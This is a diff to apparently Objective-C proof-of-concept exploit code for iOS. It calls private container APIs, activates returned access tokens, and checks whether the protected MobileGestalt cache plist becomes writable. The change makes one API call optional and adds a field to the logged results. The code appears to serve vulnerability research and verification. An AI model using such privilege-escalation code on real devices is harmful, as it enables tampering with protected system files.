@@ -86,9 +86,9 @@ int run_mobilehousearrest_poc(void)
 
     if (query_create == NULL || query_set_class == NULL ||
         query_set_ids == NULL || query_set_flags == NULL ||
-        query_set_part == NULL || query_result == NULL ||
-        query_free == NULL || object_copy == NULL || object_free == NULL ||
-        object_path == NULL || copy_token == NULL || activate == NULL) {
+        query_result == NULL || query_free == NULL || object_copy == NULL ||
+        object_free == NULL || object_path == NULL || copy_token == NULL ||
+        activate == NULL) {
         dlclose(lib);
         return 2;
     }
@@ -100,7 +100,9 @@ int run_mobilehousearrest_poc(void)
     }
     query_set_class(query, 2);                  // app-data container
     query_set_flags(query, UINT64_C(0x900000000));
-    query_set_part(query, 0);
+    if (query_set_part != NULL) {
+        query_set_part(query, 0);
+    }
 
     xpc_object_t ids = xpc_array_create(NULL, 0);
     xpc_array_set_string(ids, XPC_ARRAY_APPEND,
@@ -154,7 +156,10 @@ int run_mobilehousearrest_poc(void)
 
 int run_mobilegestalt_class13_poc(void)
 {
-    static NSString *const expectedRoot =
+    static NSString *const groupRoot =
+        @"/private/var/containers/Shared/SystemGroup/"
+         "systemgroup.com.apple.mobilegestaltcache";
+    static NSString *const cacheRoot =
         @"/private/var/containers/Shared/SystemGroup/"
          "systemgroup.com.apple.mobilegestaltcache/Library/Caches";
 
@@ -192,9 +197,9 @@ int run_mobilegestalt_class13_poc(void)
 
     if (query_create == NULL || query_set_class == NULL ||
         query_set_group_ids == NULL || query_set_flags == NULL ||
-        query_set_part == NULL || query_result == NULL ||
-        query_free == NULL || object_copy == NULL || object_free == NULL ||
-        object_path == NULL || copy_token == NULL || activate == NULL) {
+        query_result == NULL || query_free == NULL || object_copy == NULL ||
+        object_free == NULL || object_path == NULL || copy_token == NULL ||
+        activate == NULL) {
         dlclose(lib);
         return 2;
     }
@@ -213,7 +218,10 @@ int run_mobilegestalt_class13_poc(void)
     xpc_release(groups);
 #endif
     query_set_flags(query, UINT64_C(0x8100000000));
-    query_set_part(query, 3);                   // Library/Caches
+    BOOL scopedPart = query_set_part != NULL;
+    if (scopedPart) {
+        query_set_part(query, 3);               // Library/Caches
+    }
 
     container_object_t borrowed = query_result(query);
     container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
@@ -227,8 +235,9 @@ int run_mobilegestalt_class13_poc(void)
     NSString *returnedPath = rawPath != NULL
         ? [NSString stringWithUTF8String:rawPath] : nil;
     NSString *resolvedPath = NormalizePath(returnedPath ?: @"");
+    NSString *expectedRoot = scopedPart ? cacheRoot : groupRoot;
     BOOL exactRoot = [resolvedPath isEqualToString:expectedRoot];
-    NSString *plist = [expectedRoot stringByAppendingPathComponent:
+    NSString *plist = [cacheRoot stringByAppendingPathComponent:
         @"com.apple.MobileGestalt.plist"];
     BOOL deniedBefore = !CanOpenReadWrite(plist);
 
@@ -246,9 +255,9 @@ int run_mobilegestalt_class13_poc(void)
     BOOL success = exactRoot && deniedBefore && activated && writable &&
         deniedAfter;
     fprintf(stderr,
-        "MG_CLASS13 success=%d root=%s activated=%d writable=%d "
-        "post_denied=%d\n",
-        success, resolvedPath.UTF8String ?: "(null)", activated, writable,
-        deniedAfter);
+        "MG_CLASS13 success=%d root=%s part_api=%d activated=%d "
+        "writable=%d post_denied=%d\n",
+        success, resolvedPath.UTF8String ?: "(null)", scopedPart, activated,
+        writable, deniedAfter);
     return success ? 0 : 5;
 }
